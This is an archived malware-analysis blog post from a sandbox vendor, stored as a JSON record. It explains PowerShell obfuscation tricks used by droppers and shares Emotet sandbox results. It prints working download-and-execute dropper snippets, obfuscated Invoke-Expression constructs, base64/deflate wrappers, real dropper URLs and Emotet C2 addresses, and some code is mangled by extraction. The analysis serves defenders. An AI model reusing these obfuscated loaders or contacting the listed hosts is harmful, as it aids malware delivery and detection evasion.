{
    "id": "db24020a-f48e-4d3a-862e-42ada90df580",
    "created_at": "2023-01-12T14:59:51.617648Z",
    "updated_at": "2025-03-27T02:06:10.279848Z",
    "deleted_at": null,
    "sha1_hash": "caa24de0777ad3855972d4686511bef892811473",
    "title": "2020-01-07 - Powershell Static Analysis & Emotet results",
    "authors": "",
    "file_creation_date": "2022-05-28T22:02:50Z",
    "file_modification_date": "2022-05-28T22:02:50Z",
    "file_size": 184216,
    "plain_text": "# Powershell Static Analysis & Emotet results\n\n**hatching.io/blog/powershell-analysis**\n\n2020-01-07\n\ntriage\n\nmalware\n\npowershell\n\nWritten by\nTeam\n\n```\nWarning: this blogpost contains malicious URLs, don't open 'em.\n\n```\n```\nNote: Scroll down if you're only interested in the Emotet results.\n\n```\n\n## Powershell twirks\n\n\n-----\n\n[Due to a high number of Powershell droppers in our public cloud we ve implemented an](https://tria.ge/)\n[engine for Powershell that translates Powershell into an AST, deobfuscates it, and runs](https://en.wikipedia.org/wiki/Abstract_syntax_tree)\nvarious high-level static analysis algorithms on the deobfuscated AST. For specific use-cases\na limited Powershell emulator has also been implemented.\n\nWith that out of the way we wanted to share some `\"\"\"InTErEstInG\"\"\" features of the`\nPowershell language (naturally accompanied with various obfuscation techniques) and\n[provide results and statistics from Powershell-related samples submitted to tria.ge.](https://tria.ge/)\n\nWe’re going to start out with the simplest version to download a file in Powershell. Almost all\nPowershell droppers use this technique (or the `DownloadString version that fetches the`\nURL in-memory) to obtain the real payload from a URL that’s often only online for a very\nlimited period of time.\n```\n(new-object\nnet.webclient).downloadfile('hxxp://www.kuaishounew.com/wget.exe','wget.exe');\n\n```\nKeeping that in mind, most simple Powershell droppers are structured as follows; determine\nsome payload filename, set up one or more URLs, iterate through each URL and try to\ndownload it, and if successful (the file size is more than a couple of kilobytes), then execute it\nas a new process.\n```\n$path = \"...\";\n$web = New-Object net.webclient;\n$urls = \"url1,url2,url3,url4,url5\".split(\",\");\nforeach ($url in $urls) {\n  try {\n    $web.DownloadFile($url, $path);\n    if ((Get-Item $path).Length -ge 30000) {\n      [Diagnostics.Process]::Start($path);\n      break;\n    }\n  }\n  catch{}\n}\n\n```\nPowershell being a dynamic scripting language and all that, it’s possible to do things in\n[multiple ways. For example, calling the New-Object cmdlet can also be expressed with its](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-6)\nstring obfuscated through the `dot expression .`\n```\n.('new-'+'o'+'bjec'+'t') NET.weBCLIENt\n\n```\nOr through the similar `amp expression . Naturally, Powershell allowing escape sequences,`\nthere can be backticks in the identifier.\n```\n&('ne'+'w-'+'o'+'bject') nET.wE`BCLieNT\n\n```\nOr at the beginning of an identifier.\n```\nNew Object nET `wE`BCLieNT\n\n```\n\n-----\n\nOr at the end of an identifier.\n```\n.('new-obje'+'c'+'t') net`.WebClIe`Nt\n\n```\nIn order to make Powershell a truly dynamic language, it shall be possible to use a string as\nmethod/field identifier (this calls `DownloadFile on the` `net.webclient object). This string`\nidentifier may also contain backticks.\n```\n$Glmodecoxsyda.\"dO`WnlO`ADfILE\"($Muyiwcipde, $Waazouqp);\n\n```\nThere are many ways to obfuscate a string or an array. Most of the time the `split method`\nis called on a string to obtain an array of URLs.\n```\n$VlR='hxxp://kulikovonn.ru/l5vT7q19U@hxxp://opticsline.com/vUUp9ygDE@hxxp://lonestarcustompainting.com/BLC3RY4O@hxxp://montegrappa.com.p\nPS C:\\Users\\Administrator> $VlR\nhxxp://kulikovonn[.]ru/l5vT7q19U\nhxxp://optics-line[.]com/vUUp9ygDE\nhxxp://lonestarcustompainting[.]com/BLC3RY4O\nhxxp://montegrappa[.]com[.]pa/OkyoMANm\nhxxp://kristianmarlow[.]com/mhFm2oA4Q\n\n```\nThere’s also a string formatting operator for “smart” concatenation operations, in this case\nresulting in the string `\"hello\" .`\n```\nPS C:\\Users\\Administrator> \"{1}{0}\"-f(\"{1}{0}\"-f'o','ll'),'he'\nhello\n\n```\nIn practice this may look as follows.\n\n\n-----\n\n```\n$QxB__QxB ( {43}{19}{27}{11}{38}{23}{26}{34}{33}{25}{21}{3}{6}{32}{10}{14}{17}{45}\n{40}{9}{31}{13}{24}{2}{44}{41}{28}{12}{8}{29}{47}{22}{39}{48}{7}{36}{49}{37}{18}{35}\n{20}{4}{42}{0}{1}{5}{30}{16}{46}{15}\"-f (\"{0}{4}{1}{2}{3}\" -f (\"{1}{2}{0}{3}\"f'drago',':','//','n'), 'a','n','g.','f'), (\"{1}{0}{2}\" -f'a',(\"{1}{0}\" f'm/n','co'),'v'),'c','u', (\"{2}{0}{1}\"-f 'n4/','@ht','j'),'/d','zx.', (\"{1}{2}{5}{3}\n{0}{4}\"-f(\"{1}{0}\"-f':/','http'),'h/S','k',(\"{0}{1}\" -f\n'E','A/@'),'/di','hH'),'/w','htt','/',(\"{0}{1}\" -f'con','t'),\n'm','pro','wp','/','fe','-i',(\"{0}{1}\"-f (\"{1}{0}\" -f 'com','lat.'),'/'),(\"{1}{0}\" f(\"{0}{1}\"-f'tp',':/'),'t'),'O',(\"{0}{1}\" -f 'c',(\"{0}{1}\" -f'hun','b')),'em',(\"{0}\n{1}\"-f (\"{1}{0}\" -f'S8','2t'),'A'), (\"{1}{0}\"-f'ha','fit'),(\"{1}{0}\" f'ww.','/w'),'/@',(\"{1}{4}{3}{0}{2}\" -f (\"{1}{0}\"-f't.','sa'),'/ww',(\"{0}{1}{2}\"-f\n'co','m/','wp-'), 'att','w.l'),'co','p-c','w',(\"{1}{0}\" -f'//','ps:'),'com','/', (\"\n{1}{0}\"-f'ps:','htt'),(\"{0}{1}\"-f 'fl','v/'),'ego','b',(\"{1}{0}\" -f 't/','en'),(\"{0}\n{1}\"-f (\"{1}{0}\" -f 'k','es/s'),'et'), (\"{0}{1}{2}\" -f (\"{1}{0}\" f'/','des'),'I2','/@'),'.','tp','h','k',(\"{1}{0}\" -f 'clu','n'),'O',(\"{2}{0}{1}\"-f(\"\n{0}{1}\" -f'ten','t'),'/th', 'on'),'c',(\"{0}{1}\" -f 'gr','im')).\"spl`It\"('@')\nPS C:\\Users\\Administrator> $QxB__QxB\nhxxp://www[.]lattsat[.]com/wp-content/2tS8A/\nhxxps://www[.]chunbuzx[.]com/wp-includes/I2/\nhxxps://profithack[.]com/wp-content/themes/sketch/SkhHEA/\nhxxp://diegogrimblat[.]com/flv/Ojn4/\nhxxp://dragonfang[.]com/nav/dwfeO/\n\n```\nClearly building upon earlier constructs, the `\"split\" method identifier may also be`\nobfuscated with string concatenation. To make matters more interesting, object methods\nhave methods of their own, in this case `Invoke to execute the method with the arguments`\nprovided to the `Invoke method.`\n```\n(\"<urlshere>\").(\"{0}{1}\"-f'Spl','it').Invoke('@')\n\n```\nAlso note that it’s possible to do Powershell programming without the space bar as most\noperators can be put right behind each other without whitespaces in-between.\n```\nPS C:\\Users\\Administrator> 5 -band 3\n1\nPS C:\\Users\\Administrator> 5-band3\n1\nPS C:\\Users\\Administrator> \"1\",\"3\"-join\"2\"\n123\n\n```\nThe `-split operator is interesting, because the assumption is that it would return a list of`\nstrings, which it probably does. But then if you have multiple `-split operators following`\none another, you appear to get a flat list too, so probably `-split can work on both strings`\nand arrays. Note that the string separator may also be an integer, internally probably casted\nto be a string.\n\n\n-----\n\n```\nPS C:\\Users\\Administrator> he4llo0w1rld split 4 split 0 split 1 \nhe\nllo\nw\nrld\n\n```\nLike most scripting languages, it’s possible to execute arbitrary Powershell code at runtime\n(like `eval() in Javascript). This is the` [Invoke-Expression cmdlet or](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6) `iex short and looks`\nas follows.\n```\nPS C:\\Users\\Administrator> iex 'write-host 1'\n1\n\n```\nSince Powershell can handle command-line invocations, it also has a built-in pipe operator.\n```\nPS C:\\Users\\Administrator> 'write-host 1'|iex\n1\n\n```\nTo avoid specifically mentioning the `iex string, many droppers use global Powershell`\nvariables to construct the string at runtime paired with the `dot and` `amp expressions. One`\nmay find the [$ENV variable to be interesting too or at least how it’s pretty much the only](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6)\nthing that’s indexed with a colon identifier ( :comspec, with `COMSPEC being a Windows`\nenvironment variable). Each of the following expressions are equivalent to just writing out\n```\nInvoke-Expression directly.\n&( $VERBOSePREFerence.TOSTRinG()[1,3]+'x'-JOiN'')\n& ( $SheLLId[1]+$shEllId[13]+'x')\n&( $EnV:cOmSpEc[4,15,25]-JOIN'')\n\n```\n[Additionally, yes, there’s also a Set-Alias cmdlet (or](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6) `sal short) that’s capable of essentially`\nsymlinking a method or cmdlet to another name in Powershell.\n```\nPS C:\\Users\\Administrator> sal ping iex;ping(\"write-host 1\")\n1\n\n```\nWith the knowledge from all the above, we can now move into deobfuscating the first layer of\nthe following Powershell dropper. It first removes garbage characters through the `-split`\noperator and then iterates over each character using the `foreach-object cmdlet and` `-`\n```\nbxor operator, that performs a binary xor operation, to get the deobfuscated string.\n\n```\nInterestingly, both operands to the `-bxor operator are integer strings, one regular number`\n(base10) and one hexadecimal number (base16). Snippet somewhat shortened for improved\nvisibility.\n\n\n-----\n\n```\niNVoKE expREsSIOn( [sTRIng]::joIn(,\n('16,102e94&92D9&90,81~67O25D91O86D94&81,87e64{20122O81{64e26{99~81s86s119D88~93~81e90&64e15D16&109O89s123e9R19~92O64O64{68,14~27~27O67\n76-68-70D93O90{64R26&70e65&27D64{85,80~5~97D7D126e85e89~6,27'-sPLiT 'd' -sPlIt '~' SPlIt ','-sPlIt'S'-SpLIt '-'-sPlIT '&' -Split 'e' -sPLIT '{' -SpLIt'O'-SpliT 'r' |\nfOREAcH-ObjEct{[cHaR] ($_ -BXOr \"0x34\") })))\n\n```\n(This calls `Invoke-Expression with the following string, shortened for visibility).`\n```\n$Rjh=new-object Net.WebClient;$YmO='http://www[.]jxprint[.]ru/tad1U3Jam2/...\n\n```\nThe next step in obfuscation includes adding a base64 blob that’s executed (snippet\nshortened) using `[System.Convert]::FromBase64String(...) .`\n```\ninvokeexpression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('\n\n```\n(This calls `Invoke-Expression with the following string, shortened for visibility).`\n```\n$path = $env:TEMP + '\\Any Name.exe'; (New-Object\nSystem.Net.WebClient).DownloadFile('http://hbse...\n\n```\nAnd if that’s not enough, one can always spice it up with a deflate/zlib stream (snippet\nshortened) using `New-Object System.IO.Compression.DeflateStream(...) .`\n```\n&( $VERBOSePREFerence.TOSTRinG()[1,3]+'x'-JOiN'') (New-OBjeCt Io.StrEaMrEADeR( (\nNew-OBjeCt sYStEm.iO.compResSioN.DeFLaTeSTREAM([iO.mEmoRySTream]\n[sysTEM.ConVert]::frOMBASE64STrING(\n('V'+'dHR'+'at'+'swFA'+'bgV9G'+'F'+'QQl'+'Z7H'+'Z4'+'g9YYK'+'lfUZGxrvRBqQi'+'H'+'I'+'6\n ),[SYstEm.IO.ComPresSIOn.COmpRESSionModE]::DECOmPreSs)),\n[sySTeM.TExt.encOdiNG]::Ascii) ).ReadToeNd( )\n\n```\nBut what if we obfuscate the `Set-Alias parameter? This example casts an array of`\nintegers to an array of characters and then to a string (the string `\"ieX\" ). The Set-Alias`\ncommand then aliases the `sy identifier to the` `\"ieX\", which is equivalent to` `iex and`\nthus `Invoke-Expression .`\n```\n$qG=[string][char[]]@(0x69,0x65,0x58) -replace ' ','';sal sy $qG;$Wg=((New-Object\nNet.WebClient)).DownloadString('hxxp://windowsdressedup.com/admincontrol/out75927603.ps1');sy $Wg\n\n```\nNext to the `foreach-object { ... } construct, there’s also the shorter` `% { ... }`\nconstruct, both working with the pipe operator, accepting an item or an array of items. The\nfollowing results in `hello .`\n```\n((104, 101, 108, 108, 111) | %{([char] [int] $_)})-jOIN''\n\n```\nFun fact: if you replace `[char] [int] in the snippet above with` `[ChAR] [iNt] (as was`\nthe case in the sample where this example originated from), then Powershell on Windows 10\nmay avoid running it and throw the `This script contains malicious content and has`\n\n\n-----\n\n```\nbeen blocked by your antivirus software. error. This is what we call the Spongebob\n\n```\nfilter :-)\n\nNow that you’ve seen almost everything, we’re introducing the `foreach language construct`\nas obfuscated string. One might expect this to be a language keyword / statement, but well,\nhere goes. This also results in `hello .`\n```\n((104, 101, 108, 108, 111) | .('for'+'E'+'ach') { ([char][int]$_)})-jOIN''\n\n```\nIn case you’re not convinced by the power of Powershell yet, Powershell has a concept of\n```\ngeneric strings that essentially represent plaintext code that can’t possibly be correct\n\n```\nPowershell code. In other words, it’s possible to write down URLs without quotes as one\nwould normally define one or more strings. Not unsurprisingly the comma is actually\ninterpreted correctly and the below `-Source parameter of` `Start-BitsTransfer results`\nin an array of 3 URLs.\n```\nImport-Module BitsTransfer; Start-BitsTransfer -Source\nhxxps://raw.githubusercontent.com/jocofid282/tewsa/master/blow.exe,hxxps://raw.githubu\n -Destination \"$env:TEMP\\blow.exe\",\"$env:TEMP\\dera\",\"$env:TEMP\\JvlpB.exe\"\n\n```\nFortunately for us, the .NET engine also knows the concept of Secure Strings. Since some of\nour samples in production decrypt “secure strings” and then execute the plaintext code\nresulting from it, we have implemented this behavior too.\n\nWhile we were initially startled by the fact that the SecureString took around a 10x increase\nin size when compared to the plaintext string, this fact is quickly explained by the decryption\nprocess. The SecureString is essentially a hex encoded AES CBC encrypted UTF16\nencoded string. This string is then joined with the SecureString version number and the\nInitialization Vector (which itself is base64 encoded), UTF16 encoded, base64 encoded, and\nfinally a magic header is slapped onto it. The following image regarding the decryption\nprocess better explains the logic:\n\nIn terms of Powershell fun & quirks this is it for today, although there’s plenty more to talk\nabout.. wildcards, reflection, powershell executing x86 shellcode, etc.\n\n## Emotet results in production\n\nWe’ve had quite some people submit Powershell-based payloads to our public cloud,\n[partially due to our Emotet](https://tria.ge/reports/191225-a3g39c5c7j/task1) [configuration](https://tria.ge/reports/191225-as7jwva61j/task1) [extractor, but also due to numerous other malware](https://tria.ge/reports/191224-t97e5medbs/task1)\nsamples that are being uploaded on a daily basis.\n\nFurthermore, we implemented a Powershell static analysis library capable of handling the\nabove Powershell quirks and around 99% of the Powershell payloads that we’ve seen in our\n[production environment at tria.ge. Combining these two facts, we arrived at the following](https://tria.ge/)\nconclusion:\n\n\n-----\n\n**Giving back to the community, we re releasing polished sandbox results on more than**\n**50,000 unique malware samples that we believe to be Emotet-related.**\n\n[The data can be found here.](https://hatching.io/static/files/emotet07012020.json)\n\nAn example entry of polished analysis with all artifacts available (with sha256 and sha512\nhashes removed for visibility):\n```\n{\n  \"family\": \"emotet\",\n  \"taskid\": \"200101-1s48ckzwxj\",\n  \"archive\": {\n    \"md5\": \"40cb422a49bfa7ae143156f73dba4149\",\n    \"sha1\": \"6d97ee9291d0b9ad64e2c8da30c945dfa706809d\",\n  },\n  \"document\": {\n    \"md5\": \"c2f04f8e408daf34a47cce39d492902e\",\n    \"sha1\": \"70ed95f2bba918fc1833f4eafa0f780cdcfa4711\",\n  },\n  \"dropper\": {\n    \"cmdline\": \"Powershell -w hidden -en\nJABGAG4AZwBpAGEAdQB1AGoAeABrAHQAPQAnAFcAagBvAHgAdQB3AHkAdwB2ACcAOwAkAFYAdQBpAHYAZgBkAH\n    \"urls\": [\n      \"http://macomp.co.il/wp-content/d78i3j-pkx6legg5-92996338/\",\n      \"http://naymov.com/ucheba/kvl0vss-qrex4-501625964/\",\n      \"http://neovita.com/iwa21/ZvfClE/\",\n      \"http://nfsconsulting.pt/cgi-bin/YylxPF/\",\n      \"http://nitech.mu/modules/TYJwbOkm/\"\n    ]\n  },\n  \"payload\": {\n    \"filepath\": \"C:\\\\Users\\\\Admin\\\\844.exe\",\n    \"md5\": \"8565d2e08b151eac88953b4f244502fd\",\n    \"sha1\": \"a6102580563981dd6a3d399ea524248d716d2022\",\n  },\n  \"emotet\": {\n    \"pubkey\": \"-----BEGIN PUBLIC KEY----\\nMHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAMqZMACZDzcRXuSnj2OI8LeIYKrbUIXL\\nfaUgIJPwYd305HnaBS\n----END PUBLIC KEY-----\\n\",\n    \"c2\": [\n      \"85.100.122.211:80\",\n      \"78.189.165.52:8080\",\n      \"88.248.140.80:80\",\n      \"45.79.75.232:8080\",\n      \"124.150.175.133:80\",\n      ... snip ...\n    ]\n  }\n}\n\n```\nSome more information on the data file:\n\n\n-----\n\nEach line contains one JSON blob detailing one Emotet analysis.\nThe `taskid field links to the task ID on` [tria.ge, our cloud sandbox. E.g., the first entry](https://tria.ge/)\n[( 200101-1dghyjegsn ) equals the analysis at 200101-1dghyjegsn.](https://tria.ge/reports/200101-1dghyjegsn/task1)\nThe `archive hashes, if present, contain the hashes of the archive that was submitted`\nto Triage. E.g., if the sample was delivered as Office document in a Zip file.\nThe `document hashes contain the hashes of the Office dropper document or, if the`\nEmotet payload was submitted directly, the Emotet payload.\nThe `dropper entry, if present, contains information on the executed Powershell`\npayload and the Dropper URLs that we extracted from this Powershell payload. One\nmay find that many different Office documents execute the exact same Powershell\npayload, but that doesn’t make the sample hashes irrelevant.\nThe `payload hashes, if present, contain the hashes of the dropped Emotet payload.`\nThe `emotet entry, if present, contains the RSA Public Key as well as C2 information`\nembedded in the Emotet payload.\n\n## Conclusion\n\nWe’ve implemented a Powershell deobfuscator and emulator that’s capable of handling the\nvast majority of Powershell payloads that we see in our public cloud. As always, we will\ncontinue to improve our sandboxing tooling to improve handling specific use-cases and we’re\ngoing to keep an eye on all newly submitted (Powershell and other) samples!\n\nIf any customers or (potential) users would like to use any of our static analysis capabilities\nstandalone from the sandboxing side of things or if there are other requests related to our\nsandbox, please do reach out to us.\n\nHappy hunting & analyzing and stay tuned for our upcoming blogposts!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-07 - Powershell Static Analysis & Emotet results.pdf"
    ],
    "report_names": [
        "2020-01-07 - Powershell Static Analysis & Emotet results.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535591,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1653775370,
    "ts_modification_date": 1653775370,
    "files": {
        "pdf": "https://archive.orkl.eu/caa24de0777ad3855972d4686511bef892811473.pdf",
        "text": "https://archive.orkl.eu/caa24de0777ad3855972d4686511bef892811473.txt",
        "img": "https://archive.orkl.eu/caa24de0777ad3855972d4686511bef892811473.jpg"
    }
}